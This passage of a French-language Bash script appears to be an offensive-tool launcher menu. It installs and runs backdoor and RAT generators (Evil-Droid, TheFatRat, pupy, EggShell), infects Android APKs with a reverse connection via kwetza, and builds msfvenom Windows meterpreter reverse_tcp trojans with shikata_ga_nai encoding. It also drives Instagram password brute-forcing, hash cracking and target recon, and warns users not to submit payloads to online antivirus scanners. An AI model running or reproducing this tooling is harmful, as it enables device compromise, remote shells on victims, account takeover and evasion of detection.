			./beef
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_beef
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "26" ]]
	then
		if [[ -d /root/Evil-Droid ]]
		then
			cd /root/Evil-Droid
			./evil-droid
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_evil_droid
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "27" ]]
	then
		if [[ -d /root/EggShell ]]
		then
			cd /root/EggShell
			python eggshell.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_eggshell
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "28" ]]
	then
		if [[ -d /root/Zerodoor ]]
		then
			cd /root/Zerodoor
			python zerodoor.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_zerodoor
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "29" ]]
	then
		if [[ -d /root/cromos ]]
		then
			cd /root/cromos
			cromos_menu
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_cromos
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "30" ]]
	then
		if [[ -d /root/AutoSploit ]]
		then
			cd /root/AutoSploit
			python autosploit.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_autosploit
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "31" ]]
	then
		if [[ -d /root/Enigma ]]
		then
			cd /root/Enigma
			python enigma.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_enigma
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "8" ]]
	then
		if [[ -d /root/CHAOS ]]
		then
			cd /root/CHAOS
			go run CHAOS.go
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_chaos
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "9" ]]
	then
		if [[ -d /root/kwetza ]]
		then
			cd /root/kwetza
			printf '\033]2;KWETZA\a'
			while true
			do
				clear
				if [[ "$APK" = "" ]]
				then
					APK="\e[1;31mNONE\e[m"
				fi
				if [[ "$APKLH" = "" ]]
				then
					APKLH="\e[1;31mNONE\e[m"
				fi
				if [[ "$APKLP" = "" ]]
				then
					APKLP="\e[1;31mNONE\e[m"
				fi
				if [[ "$APKPROT" = "" ]]
				then
					APKPROT="tcp"
				fi
				if [[ "$APKPERM" = "" ]]
				then
					APKPERM="yes"
				fi
				echo -e ""$YS" 1"$CE") Apk à infecter                              ACTUEL:$APK"
				echo -e ""$YS" 2"$CE") LHOST                                       ACTUEL:$APKLH"
				echo -e ""$YS" 3"$CE") LPORT                                       ACTUEL:$APKLP"
				echo -e ""$YS" 4"$CE") Protocol                                    ACTUEL:$APKPROT"
				echo -e ""$YS" 5"$CE") Ajouter des autorisations supplémentaires   ACTUEL:$APKPERM"
				echo -e ""$YS" b"$CE") Retour"
				echo -e ""$YS" run"$CE") Infecter apk"
				echo -e "Choix: "
				read APKK
				clear
				if [[ "$APKK" = 1 ]]
				then
					echo -e "Apk à infecter(doit être dans /root/kwetza): "
					read APKTBI
					if [[ -f "$APKTBI" ]]
					then
						APK="$APKTBI"
					else
						echo -e ""$RS"/root/kwetza/"$APKTBI" non trouvé"$CE""
						sleep 3
					fi
				elif [[ "$APKK" = 2 ]]
				then
					echo -e "LHOST: "
					read APKLH
				elif [[ "$APKK" = 3 ]]
				then
					echo -e "LPORT: "
					read APKLP
				elif [[ "$APKK" = 4 ]]
				then
					if [[ "$APKPROT" = "tcp" ]]
					then
						APKPROT="https"
					else
						APKPROT="tcp"
					fi
				elif [[ "$APKK" = 5 ]]
				then
					if [[ "$APKPERM" = "yes" ]]
					then
						APKPERM="no"
					else
						APKPERM="yes"
					fi
				elif [[ "$APKK" = "back" || "$APKK" = "b" ]]
				then
					break
				elif [[ "$APKK" = "run" ]]
				then
					if [[ "$APK" = "\e[1;31mNONE\e[m" ]]
					then
						echo -e ""$RS"Pas d'apk spécifié."$CE""
						sleep 3
						continue
					fi
					if [[ "$APKLH" = "\e[1;31mNONE\e[m" ]]
					then
						echo -e ""$RS"Pas de LHOST spécifié."$CE""
						sleep 3
						continue
					fi
					if [[ "$APKLP" = "\e[1;31mNONE\e[m" ]]
					then
						echo -e ""$RS"Pas de LPORT spécifié."$CE""
						sleep 3
						continue
					fi
					cd /root/kwetza
					python kwetza.py $APK $APKLH $APKPROT $APKLP $APKPERM
					echo -e "$PAKTGB"
					$READAK
				fi
			done
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_kwetza
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "7" ]]
	then
		if [[ -f /usr/bin/shellter ]]
		then
			shellter
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_shellter
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "2" ]]
	then
		if [[ -d /root/ezsploit ]]
		then
			cd /root/ezsploit/
			./ezsploit.sh
			cd
			echo -e "Accédez au menu metasploit pour créer un écouteur(Option "$YS"14"$CE")"
			sleep 2
			echo -e "Appuyez sur "$YS"une touche"$CE" pour quitter..."
			$READAK
			exec bash "$0"
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_ezsploit
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "3" ]]
	then
		if [[ -d /root/pupy ]]
		then
			while true
			do
			clear
			echo -e ""$YS" 1"$CE") Générer un Payload"
			echo -e ""$YS" 2"$CE") Démarrer l'écouteur"
			echo -e ""$YS" b"$CE") Retour"
			echo -e ""$YS"00"$CE") Menu principal"
			echo -e ""$YS" 0"$CE") QUITTER"
			read -e PUPY
			if [[ "$PUPY" = "1" ]]
			then
				clear
				echo -e "Choisir l'OS de la cible:"
				echo -e ""$YS" 1"$CE") Windows"
				echo -e ""$YS" 2"$CE") Linux"
				echo -e ""$YS" 3"$CE") Android"
				echo -e "Choix: "
				read -e TAROS
				if [[ "$TAROS" = "1" ]]
				then
					TAROS="windows"
				elif [[ "$TAROS" = "2" ]]
				then
					TAROS="linux"
				elif [[ "$TAROS" = "3" ]]
				then
					TAROS="android"
				else
					echo -e "Mauvais choix. Retour au menu principal..."
					sleep 2
					exec bash "$0"
				fi
				clear
				echo -e "Entrez votre IP: "
				read -e PUPYIP
				clear
				echo -e "Entrez votre port(e.g: 443): "
				read -e PUPYPORT
				clear
				echo -e "Entrer le chemin sortie complet(e.g: /root/Desktop/payload1.exe)"
				read -e PUPYPATH
				cd /root/pupy/pupy
				./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
				cd
			elif [[ "$PUPY" = "2" ]]
			then
				cd /root/pupy/pupy
				./pupysh.py
			elif [[ "$PUPY" = "00" ]]
			then
				exec bash "$0"
			elif [[ "$PUPY" = "back" || "$PUPY" = "b" ]]
			then
				break
			elif [[ "$PUPY" = "0" ]]
			then
				exit
			fi
			done
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_pupy
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "4" ]]
	then
		if [[ -d /root/zirikatu ]]
		then
			clear
			echo -e "ATTENTION: NE PAS télécharger sur des scanners antivirus en ligne."
			sleep 3
			echo -e "Vous êtes d'accord?("$YS"YES"$CE"/"$YS"*"$CE")"
			read MUSTBEYES
			if [[ "$MUSTBEYES" = "YES" ]] 
			then 
				clear
				cd /root/zirikatu
				./zirikatu.sh
				cd
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_zirikatu
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "5" ]]
	then
		if [[ -d /root/TheFatRat ]]
		then
			fatrat
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_thefatrat
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "6" ]]
	then
		if [[ -d /root/Winpayloads ]]
		then
			cd /root/Winpayloads
			./WinPayloads.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_winpayloads
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$KEYLOG" = "0" ]]
	then
		clear
		exit
	elif [[ "$KEYLOG" = "back" || "$KEYLOG" = "b" ]]
	then
		break
	fi
	echo -e "$PAKTGB"
	$READAK
	done
}
function information_gathering
{
	while true 
	do
		clear
		TERMINALTITLE="COLLECTE D'INFORMATION"
		dash_calc
		printf '\033]2;COLLECTE D INFORMATION\a'
		if [[ -d /usr/share/sniper ]]
		then
			echo -e ""$YS" 1"$CE") Sniper                Scanner Pentest Recon automatisé"
		else
			echo -e ""$RS" 1"$CE") "$RS"Sniper"$CE"                Scanner Pentest Recon automatisé"
		fi
		if [[ -d /root/ReconDog ]]
		then
			echo -e ""$YS" 2"$CE") ReconDog              Outil tout en un"
		else
			echo -e ""$RS" 2"$CE") "$RS"ReconDog"$CE"              Outil tout en un"
		fi
		if [[ -d /root/RED_HAWK ]]
		then
			echo -e ""$YS" 3"$CE") RED HAWK              Outil tout en un"
		else
			echo -e ""$RS" 3"$CE") "$RS"RED HAWK"$CE"              Outil tout en un"
		fi
		if [[ -d /root/Infoga ]]
		then
			echo -e ""$YS" 4"$CE") Infoga                Collecte d'information par email"
		else
			echo -e ""$RS" 4"$CE") "$RS"Infoga"$CE"                Collecte d'information par email"
		fi
		if [[ -d /root/KnockMail ]]
		then
			echo -e ""$YS" 5"$CE") KnockMail             Vérifier si l'email existe"
		else
			echo -e ""$RS" 5"$CE") "$RS"KnockMail"$CE"             Vérifier si l'email existe"
		fi
		if [[ -d /root/operative-framework ]]
		then
			echo -e ""$YS" 6"$CE") Operative-framework   Obtenir des informations sur le site ou la cible"
		else
			echo -e ""$RS" 6"$CE") "$RS"Operative-framework"$CE"   Obtenir des informations sur le site ou la cible"
		fi
		if [[ -d /root/osrframework ]]
		then
			echo -e ""$YS" 7"$CE") Osrfconsole           Effectuer des recherches précises en ligne"
		else
			echo -e ""$RS" 7"$CE") "$RS"Osrfconsole"$CE"           Effectuer des recherches précises en ligne"
		fi
		echo -e ""$YS" b"$CE") Retour"
		echo -e ""$YS"00"$CE") Menu principal"
		echo -e "Choix: "
		read INFOG
		clear
		if [[ "$INFOG" = 1 ]]
		then
			if [[ -d /usr/share/sniper ]]
			then
				echo -e "Entrez le domaine que vous voulez scanner: "
				read DOMAIN
				clear
				sniper $DOMAIN
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_sniper
				else
					continue
				fi
			fi
		elif [[ "$INFOG" = 2 ]]
		then
			if [[ -d /root/ReconDog ]]
			then
				cd /root/ReconDog
				python dog.py
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_recondog
				else
					continue
				fi
			fi
		elif [[ "$INFOG" = 3 ]]
		then
			if [[ -d /root/RED_HAWK ]]
			then
				cd /root/RED_HAWK
				php rhawk.php
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_redhawk
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = 4 ]]
		then
			if [[ -d /root/Infoga ]]
			then
				echo -e "Domaine à rechercher:"
				read INFOTARG
				echo -e "Data source(e.g. "$YS"all"$CE","$YS"google"$CE","$YS"bing"$CE","$YS"yahoo"$CE","$YS"pgp"$CE"): "
				read INFOSOUR
				clear
				cd /root/Infoga
				python infoga.py -t $INFOTARG -s $INFOSOUR 
				echo -e "$PAKTGB"
				$READAK
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_infoga
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = 5 ]]
		then
			if [[ -d /root/KnockMail ]]
			then
				clear
				cd /root/KnockMail
				python2.7 knock.py
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_knockmail
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = 6 ]]
		then
			if [[ -d /root/operative-framework ]]
			then
				clear
				cd /root/operative-framework
				python2.7 operative.py
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_operative
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = "7" ]]
		then
			if [[ -d "/root/hakkuframework" ]]
			then
				while true
				do
					printf '\033]2;OSRFCONSOLE\a'
					clear
					echo -e ""$YS" 1"$CE") usufy"
					echo -e ""$YS" 2"$CE") mailfy"
					echo -e ""$YS" 3"$CE") searchfy"
					echo -e ""$YS" 4"$CE") domainfy"
					echo -e ""$YS" 5"$CE") phonefy"
					echo -e ""$YS" 6"$CE") entify"
					echo -e ""$YS" b"$CE") Retour"
					echo -e ""$YS"00"$CE") Menu principal"
				#	echo -e ""$YS" 0"$CE") EXIT"
					echo -e "Choix: "
					read -e OSFR
					clear
					if [[ "$OSFR" = "1" ]]
					then
						echo -e "Use: usufy.py -n name1 name2 -p twitter facebook"
						usufy.py
						exit
					elif [[ "$OSFR" = "2" ]]
					then
						echo -e "Use: mailfy.py -n name1"
						mailfy.py
						exit
					elif [[ "$OSFR" = "3" ]]
					then
						searchfy.py
						exit
					elif [[ "$OSFR" = "4" ]]
					then
						domainfy.py
						exit
					elif [[ "$OSFR" = "5" ]]
					then
						phonefy.py
						exit
					elif [[ "$OSFR" = "6" ]]
					then
						entify.py
						exit
					elif [[ "$OSFR" = "0" ]]
					then
						exit
					elif [[ "$OSFR" = "00" ]]
					then
						exec bash "$0"
					elif [[ "$OSFR" = "back" || "$OSFR" = "b" ]]
					then
						break
					else 
						echo -e "Mauvais choix"
						sleep 0.3
						clear
						exec bash "$0"
					fi
				done
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_osrframework
				else
					continue
				fi
			fi
		elif [[ "$INFOG" = 0 ]]
		then
			exit
		elif [[ "$INFOG" = 00 ]]
		then
			exec bash $0
		elif [[ "$INFOG" = "back" || "$INFOG" = "b" ]]
		then
			break
		fi
		echo -e "$PAKTGB"
		$READAK
	done
}
function website_tools
{
	while true 
	do
		clear
		TERMINALTITLE="WEBSITE TOOLS"
		dash_calc
		printf '\033]2;WEBSITE TOOLS\a'
		if [[ -f /usr/bin/sqlmap ]]
		then
			echo -e ""$YS" 1"$CE") SQLmap                Outil d'injection SQL automatique et de reprise de base de données"
		else
			echo -e ""$RS" 1"$CE") "$RS"SQLmap"$CE"                Outil d'injection SQL automatique et de reprise de base de données"
		fi
		if [[ -d /root/leviathan ]]
		then
			echo -e ""$YS" 2"$CE") Leviathan             Toolkit d'audit de masse à large range"
		else
			echo -e ""$RS" 2"$CE") "$RS"Leviathan"$CE"             Toolkit d'audit de masse à large range"
		fi
		if [[ -d /root/NoSQLMap ]]
		then
			echo -e ""$YS" 3"$CE") NoSQLMap              Outil d'exploitation NoSQL automatisé"
		else
			echo -e ""$RS" 3"$CE") "$RS"NoSQLMap"$CE"              Outil d'exploitation NoSQL automatisé"
		fi
		if [[ -d /root/Yuki-Chan-The-Auto-Pentest ]]
		then
			echo -e ""$YS" 4"$CE") Yuki Chan             Outil Pentest automatisé"
		else
			echo -e ""$RS" 4"$CE") "$RS"Yuki Chan"$CE"             Outil Pentest automatisé"
		fi
		if [[ -d /root/Blazy ]]
		then
			echo -e ""$YS" 5"$CE") Blazy                 Brutforceur/tests de login pour CSRF, Cj, Cloudflare, WAF"
		else
			echo -e ""$RS" 5"$CE") "$RS"Blazy"$CE"                 Brutforceur/tests de login pour CSRF, Cj, Cloudflare, WAF"
		fi
		if [[ -d /root/Striker ]]
		then
			echo -e ""$YS" 6"$CE") Striker               Scanner d'informations et de vulnérabilités offensif"
		else
			echo -e ""$RS" 6"$CE") "$RS"Striker"$CE"               Scanner d'informations et de vulnérabilités offensif"
		fi
		if [[ -d /root/hyprPulse ]]
		then
			echo -e ""$YS" 7"$CE") HyprPulse             Brute force plusieurs compte à la fois"
		else
			echo -e ""$RS" 7"$CE") "$RS"HyprPulse"$CE"             Brute force plusieurs compte à la fois"
		fi
		if [[ -d /root/hyprPulse ]]
		then
			echo -e ""$YS" 8"$CE") InstaBurst            Un moyen plus rapide pour brute force Instagram"
		else
			echo -e ""$RS" 8"$CE") "$RS"InstaBurst"$CE"             Un moyen plus rapide pour brute force Instagram"
		fi
		if [[ -f /usr/local/bin/instagram-py ]]
		then
			echo -e ""$YS" 9"$CE") Instagram-py          Brute force Instagram sans limitation de mot de passe"
		else
			echo -e ""$RS" 9"$CE") "$RS"Instagram-py"$CE"          Brute force Instagram sans limitation de mot de passe"
		fi
		if [[ -d /root/datasploit ]]
		then
			echo -e ""$YS"10"$CE") Datasploit            Recon sur les Companies, People, Phone, Bitcoin..."
		else
			echo -e ""$RS"10"$CE") "$RS"Datasploit"$CE"            Recon sur les Companies, People, Phone, Bitcoin..."
		fi
		if [[ -d /root/SiteBroker ]]
		then
			echo -e ""$YS"11"$CE") SiteBroker            Utilitaire pour pénétrer et tester les sites"
		else
			echo -e ""$RS"11"$CE") "$RS"SiteBroker"$CE"            Utilitaire pour pénétrer et tester les sites"
		fi
		echo -e ""$YS" b"$CE") Retour"
		echo -e ""$YS"00"$CE") Menu principal"
		echo -e "Choix: "
		read WEB
		clear
		if [[ "$WEB" = 1 ]]
		then
			if [[ -f /usr/bin/sqlmap ]]
			then
				sqlmap_menu
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_sqlmap
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 2 ]]
		then
			if [[ -d /root/leviathan ]]
			then
				cd /root/leviathan
				python leviathan.py
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_leviathan
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 3 ]]
		then
			if [[ -d /root/NoSQLMap ]]
			then
				cd /root/NoSQLMap
				python nosqlmap.py
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_nosqlmap
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 4 ]]
		then
			if [[ -d /root/Yuki-Chan-The-Auto-Pentest ]]
			then
				cd /root/Yuki-Chan-The-Auto-Pentest
				./yuki.sh
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_yuki
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 5 ]]
		then
			if [[ -d /root/Blazy ]]
			then
				cd /root/Blazy
				python blazy.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_blazy
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 6 ]]
		then
			if [[ -d /root/Striker ]]
			then
				cd /root/Striker
				python striker.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_striker
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 7 ]]
		then
			if [[ -d /root/hyprPulse ]]
			then
				cd /root/hyprPulse
				python pulsar.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_hyprpulse
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 8 ]]
		then
			if [[ -d /root/InstaBurst ]]
			then
				cd /root/InstaBurst
				python instagram.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_instaburst
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 9 ]]
		then
			if [[ -f /usr/local/bin/instagram-py ]]
			then
				while true
				do
					clear
					TERMINALTITLE="Instagram-py"
					dash_calc
					printf '\033]2;Instagram-py\a'
					echo -e " "$YS"1"$CE") Nouvelle attaque"
					echo -e " "$YS"2"$CE") Poursuivre l'attaque précédente"
					echo -e " "$YS"3"$CE") Voir les mots de passe cracké"
					echo -e " "$YS"4"$CE") Créer une configuration"
					echo -e " "$YS"b"$CE") Retour"
					read C
					clear
					if [[ "$C" == 1 ]]
					then
						echo -e ""$YS"Username: "$CE""
						read USRNM
						echo -e ""$YS"Chemin de la Wordlist: "$CE""
						read WRDLST
						if [[ ! -f "$WRDLST" ]]
						then
							echo -e ""$RS"Aucun fichier trouvé"$CE""
							sleep 2
							continue
						fi
						instagram-py -vvv -u "$USRNM" -pl "$WRDLST"
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$C" == 2 ]]
					then
						echo -e ""$YS"Username: "$CE""
						read USRNM
						echo -e ""$YS"Chemin de la Wordlist: "$CE""
						read WRDLST
						if [[ ! -f "$WRDLST" ]]
						then
							echo -e ""$RS"Aucun fichier trouvé"$CE""
							sleep 2
							continue
						fi
						instagram-py -vvv -c -u "$USRNM" -pl "$WRDLST"
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$C" == 3 ]]
					then
						echo -e ""$YS"Username: "$CE""
						read USRNM
						instagram-py -i "$USRNM"
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$C" == 4 ]]
					then
						instagram-py -cc
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$C" == "b" || "$C" == "back" ]]
					then
						clear
						break
					elif [[ "$C" == 0 ]]
					then
						clear
						exit
					elif [[ "$C" == 00 ]]
					then
						exec bash $0
					fi
				done
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_instagram-py
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 10 ]]
		then
			if [[ -d /root/datasploit ]]
			then
				echo -e ""$YS"Domaine: "$CE""
				read DMN
				cd /root/datasploit
				python datasploit.py -i "$DMN"
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_datasploit
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 11 ]]
		then
			if [[ -d /root/SiteBroker ]]
			then
				cd /root/SiteBroker
				python SiteBroker.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_sitebroker
				else
					continue
				fi
			fi

		elif [[ "$WEB" = "" ]]
		then
			continue
		elif [[ "$WEB" = 0 ]]
		then
			exit
		elif [[ "$WEB" = 00 ]]
		then
			exec bash $0
		elif [[ "$WEB" = "back" || "$WEB" = "b" ]]
		then
			break
		fi
		#~ echo -e "$PAKTGB"
		#~ $READAK
	done
}
function other_tools
{
while true
do
	printf '\033]2;AUTRES OUTILS\a'
	clear
	TERMINALTITLE="AUTRES OUTILS"
	dash_calc
	if [[ -f /usr/bin/geany ]]
	then
		echo -e ""$YS" 1"$CE") Geany            Meilleur notepad pour linux"
	else
		echo -e ""$RS" 1"$CE") "$RS"Geany"$CE"            Meilleur notepad pour linux"
	fi
	if [[ -d /root/dagon ]]
	then
		echo -e ""$YS" 2"$CE") Dagon            Hash cracker/Advanced Hash Manipulation"
	else
		echo -e ""$RS" 2"$CE") "$RS"Dagon"$CE"            Hash cracker/Advanced Hash Manipulation"
	fi
	if [[ -d /root/LALIN ]]
	then
		echo -e ""$YS" 3"$CE") LALIN            Installer automatiquement n'importe quel paquet pour pentest "
	else
		echo -e ""$RS" 3"$CE") "$RS"LALIN"$CE"            Installer automatiquement n'importe quel paquet pour pentest "
	fi
	if [[ -d /root/cupp ]]
	then
		echo -e ""$YS" 4"$CE") Cupp             Créer des worldlists spécifiques"
	else
		echo -e ""$RS" 4"$CE") "$RS"Cupp"$CE"             Créer des worldlists spécifiques"
	fi
	if [[ -d /root/cupp ]]
	then
		echo -e ""$YS" 5"$CE") Bleachbit        Libérer de l'espace"
	else
		echo -e ""$RS" 5"$CE") "$RS"Bleachbit"$CE"        Libérer de l'espace"
	fi
	if [[ -d /root/Hash-Buster ]]
	then
		echo -e ""$YS" 6"$CE") Hash Buster      Hash cracker"
	else
		echo -e ""$RS" 6"$CE") "$RS"Hash Buster"$CE"      Hash cracker"
	fi
	if [[ -d /root/patator ]]
	then
		echo -e ""$YS" 7"$CE") Patator          Bruteforcer"
	else
		echo -e ""$RS" 7"$CE") "$RS"Patator"$CE"          Bruteforcer"
	fi
	echo -e ""$YS" b"$CE") Retour"
	echo -e ""$YS" 0"$CE") QUITTER"
	echo -e "Choix: "
	read -e OTHERT
	clear
	if [[ "$OTHERT" = 1 ]]
	then
		if [[ -f /usr/bin/geany ]]
		then
			geany
		else
			echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_geany
				else
					continue
				fi

		fi
	elif [[ "$OTHERT" = 2 ]]
	then
		if [[ -d /root/dagon ]]
		then
			dagon_script
		else
			echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_dagon
				else
					continue
				fi

		fi
	elif [[ "$OTHERT" = 3 ]]
	then
		if [[ -d /root/LALIN ]]
		then
			cd /root/LALIN
			./Lalin.sh
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_lalin
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = "4" ]]
	then
		if [[ -d "/root/cupp" ]]
		then
			cd /root/cupp
			python cupp.py -i
			cd		
			echo -e "$PAKTGB"
			$READAK	
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_cupp
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = "5" ]]
	then
		if [[ -f "/usr/bin/bleachbit" ]]
		then
			bleachbit		
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_bleachbit
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = "6" ]]
	then
		if [[ -d "/root/Hash-Buster" ]]
		then
			cd /root/Hash-Buster
			python hash.py	
			echo -e "$PAKTGB"
			$READAK	
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_hashbuster
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = "7" ]]
	then
		if [[ -d "/root/patator" ]]
		then
			patator_automation
			echo -e "$PAKTGB"
			$READAK	
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_patator
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = 00 ]]
	then
		clear
		exec bash $0
	elif [[ "$OTHERT" = "back" || "$OTHERT" = "b" ]]
	then
		break
	elif [[ "$OTHERT" = 0 ]]
	then
		clear
		exit
	fi
done
}
function findsploit_menu
{
	clear
	echo -e "Chercher: "
	read FSEARCH
	findsploit "$FSEARCH"
	echo -e "$PAKTGB"
	$READAK
}
function metasploit_menu
{
	if [[ ! -d "$LPATH"/rc ]]
	then
		mkdir "$LPATH"/rc
	fi
	while true
	do
	clear
	TERMINALTITLE="METASPLOIT"
	dash_calc
	printf '\033]2;METASPLOIT\a'
	echo -e ""$YS" 1"$CE") Créer un Payload avec msfvenom"
	echo -e ""$YS" 2"$CE") Créer un écouteur"
	echo -e ""$YS" 3"$CE") Sauvegarder l'écouteur"
	echo -e ""$YS" 4"$CE") Start msfconsole"
	echo -e ""$YS" 5"$CE") Update msfconsole"
	echo -e ""$YS" 6"$CE") Armitage"
	echo -e ""$YS" 7"$CE") Findsploit"
	echo -e ""$YS" b"$CE") Retour"
	echo -e ""$YS" 0"$CE") QUITTER"
	echo -e "Choix: "
	read -e METASP
	clear
	if [[ "$METASP" = "1" ]]
	then
		PAYLOADL=""
		echo -e "PAYLOAD (Défaut: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
		read PAYLOADL
		if [[ -z "$PAYLOADL" ]]
		then
			echo -e "Réglage du PAYLOAD sur windows/meterpreter/reverse_tcp"
			sleep 2
			PAYLOADL="windows/meterpreter/reverse_tcp"
		fi
		echo -e "LHOST: "
		read ATIP
		echo -e ""
		echo -e "LPORT: "
		read ATPORT
		echo -e ""
		echo -e "Entrer l'architecture de la cible("$YS"x86"$CE"/"$YS"x64"$CE"): "
		read TARCH
		echo -e "Entrer le nom du Payload(e.g: "$YS"trojan2"$CE"): "
		read ATEXE
		ATEXEPATH="/root/Desktop/$ATEXE.exe"
		clear
		echo -e "Création"
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		if [[ "$TARCH" = "x64" ]]
		then
			msfvenom -p $PAYLOADL --platform windows -a x64 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
		else
			msfvenom -p $PAYLOADL --platform windows -a x86 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
		fi
		echo -e "Fait."
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		clear
		echo -e "Créer un écouteur pour ce Payload? $YNYES "
		read PAYL
		if [[ "$PAYL" != "n" ]]
		then
			echo -e "Nom de l'écouteur(e.g: "$YS"john"$CE") : "
			read NAMEL
